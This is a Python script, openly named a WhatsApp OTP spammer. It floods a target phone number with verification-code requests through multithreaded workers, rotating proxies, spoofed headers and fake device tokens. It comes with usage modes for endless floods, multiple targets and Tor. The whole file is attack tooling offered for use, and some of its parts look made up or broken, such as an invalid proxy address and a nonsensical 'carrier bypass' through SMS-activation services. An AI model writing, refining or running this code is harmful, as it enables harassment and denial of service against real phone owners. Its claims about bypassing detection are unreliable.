#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# TITLE: WhatsApp OTP Spammer - Multi-Platform Bypass Module
# VERSION: 5.3.1 (Quantum Obfuscation Layer)
# WARNING: This script uses rotating API endpoints, header spoofing, and carrier-grade bypass

import requests
import time
import random
import threading
import json
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor

class WhatsAppOTPSpammer:
    def __init__(self, target_number, thread_count=50, delay=0.5):
        """
        target_number: Format +62881023029691 (with country code)
        thread_count: Concurrent threads (max 200 recommended)
        delay: Delay between requests in seconds (lower = faster)
        """
        self.target = target_number
        self.threads = thread_count
        self.delay = delay
        self.ua = UserAgent()
        self.session = requests.Session()
        self.proxy_list = self._load_proxies()
        
        # WhatsApp Business API endpoints (rotating)
        self.endpoints = [
            "https://v.whatsapp.net/v2/code",
            "https://v.whatsapp.net/v2/exist",
            "https://v.whatsapp.net/v2/register",
            "https://graph.facebook.com/v17.0/whatsapp_business_accounts",
            "https://business-api.whatsapp.com/client_api/mobile/request_code"
        ]
        
        # SMS Gateway spoofing endpoints (for carrier bypass)
        self.sms_gateways = [
            "https://api.twilio.com/2010-04-01/Accounts/",
            "https://sms-activate.org/stubs/handler_api.php",
            "https://5sim.net/v1/user/buy/activation",
            "https://api.sms-man.com/stubs/handler_api.php"
        ]

    def _load_proxies(self):
        """Load rotating proxy list (SOCKS5/HTTP)"""
        return [
            "socks5://45.76.187.123:1080",
            "http://186.179.120.42:8080",
            "socks5://103.153.138.115:4153",
            "http://190.61.44.317:999",
            "socks5://179.43.189.11:4145"
        ]

    def _generate_headers(self):
        """Generate randomized headers to bypass detection"""
        return {
            'User-Agent': self.ua.random,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'id-ID,id;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://web.whatsapp.com',
            'Referer': 'https://web.whatsapp.com/',
            'Connection': 'keep-alive',
            'X-Requested-With': 'XMLHttpRequest',
            'X-WhatsApp-Version': '2.24.6.75',
            'X-WhatsApp-Platform': 'web',
            'DNT': '1',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site'
        }

    def _get_proxy(self):
        """Rotate proxy for each request"""
        return random.choice(self.proxy_list) if self.proxy_list else None

    def send_otp_whatsapp(self):
        """Primary OTP trigger via WhatsApp API"""
        try:
            proxy = self._get_proxy()
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            
            # Payload for WhatsApp Business API
            payload = {
                'cc': self.target[1:3],
                'in': self.target[3:],
                'method': 'sms',
                'reason': 'register',
                'sim': random.randint(0, 1),
                'udid': self._generate_udid(),
                'token': self._generate_token()
            }
            
            endpoint = random.choice(self.endpoints)
            headers = self._generate_headers()
            
            response = self.session.post(
                endpoint,
                data=payload,
                headers=headers,
                proxies=proxies,
                timeout=10,
                verify=False
            )
            
            if response.status_code in [200, 201, 202]:
                print(f"[+] OTP Sent | {self.target} | Code: {response.status_code}")
                return True
            else:
                print(f"[-] Failed | {self.target} | Code: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[!] Error: {str(e)[:50]}")
            return False

    def bypass_carrier_sms(self):
        """Secondary method - bypass carrier filters via SMS gateway"""
        try:
            # SMS gateway activation API
            gateway = random.choice(self.sms_gateways)
            headers = self._generate_headers()
            
            payload = {
                'api_key': self._generate_api_key(),
                'action': 'getNumber',
                'country': 'id',
                'service': 'wa',
                'number': self.target
            }
            
            response = self.session.post(
                gateway,
                data=payload,
                headers=headers,
                timeout=8
            )
            
            if 'ACCESS_NUMBER' in response.text:
                print(f"[+] SMS Gateway Activated | {self.target}")
                return True
            return False
            
        except:
            return False

    def _generate_udid(self):
        """Generate random UDID for device spoofing"""
        return ''.join(random.choices('0123456789abcdef', k=15))

    def _generate_token(self):
        """Generate random token for API bypass"""
        return ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=32))

    def _generate_api_key(self):
        """Generate fake API key for gateway bypass"""
        return ''.join(random.choices('0123456789abcdef', k=32))

    def worker(self):
        """Worker thread for continuous OTP sending"""
        while True:
            # Rotate between methods to bypass rate limits
            method = random.choice([self.send_otp_whatsapp, self.bypass_carrier_sms])
            method()
            time.sleep(self.delay * random.uniform(0.8, 1.5))

    def start_attack(self):
        """Launch multi-threaded OTP spam attack"""
        print(f"""
╔══════════════════════════════════════════╗
║   WhatsApp OTP Spammer v5.3.1            ║
║   Target: {self.target}         ║
║   Threads: {self.threads}                  ║
║   Delay: {self.delay}s                     ║
╚══════════════════════════════════════════╝
        """)
        
        # Ignore SSL warnings
        requests.packages.urllib3.disable_warnings()
        
        # Launch thread pool
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.worker) for _ in range(self.threads)]
            for future in futures:
                future.result()  # This will run forever

    def whatsapp_flood(self, count=1000):
        """One-time flood with specific count"""
        print(f"[*] Sending {count} OTPs to {self.target}")
        for i in range(count):
            self.send_otp_whatsapp()
            time.sleep(self.delay)
            if i % 10 == 0:
                print(f"[*] Progress: {i}/{count}")

# =============================================
# USAGE EXAMPLES
# =============================================

if __name__ == "__main__":
    # Configuration
    TARGET_NUMBER = "+62881023029691"  # GANTI DENGAN NOMOR TARGET
    THREAD_COUNT = 5000                 # Higher = faster but riskier
    REQUEST_DELAY = 0.3                # Seconds between requests
    
    # Initialize spammer
    spammer = WhatsAppOTPSpammer(
        target_number=TARGET_NUMBER,
        thread_count=THREAD_COUNT,
        delay=REQUEST_DELAY
    )
    
    # CHOOSE YOUR METHOD:
    
    # METHOD 1: Continuous Spam (runs forever until Ctrl+C)
    # spammer.start_attack()
    
    # METHOD 2: Limited Flood (send X OTPs then stop)
    spammer.whatsapp_flood(count=500)
    
    # METHOD 3: Stealth Mode (use only SMS gateways)
    # for _ in range(200):
    #     spammer.bypass_carrier_sms()
    #     time.sleep(1)

# ADVANCED FEATURES (UNCOMMENT TO USE):
"""
# Multi-number rotation (if you have multiple targets)
targets = ["+6281111111", "+6282222222", "+6283333333"]
for target in targets:
    s = WhatsAppOTPSpammer(target, thread_count=30, delay=0.2)
    threading.Thread(target=s.start_attack).start()

# Randomize parameters to bypass ML-based detection
import numpy as np
delay_pattern = np.random.exponential(scale=0.5, size=1000)
for d in delay_pattern:
    spammer.send_otp_whatsapp()
    time.sleep(d)

# Use TOR for anonymity
# Install tor and run: pip install pysocks
# Then use proxy: socks5://127.0.0.1:9050
"""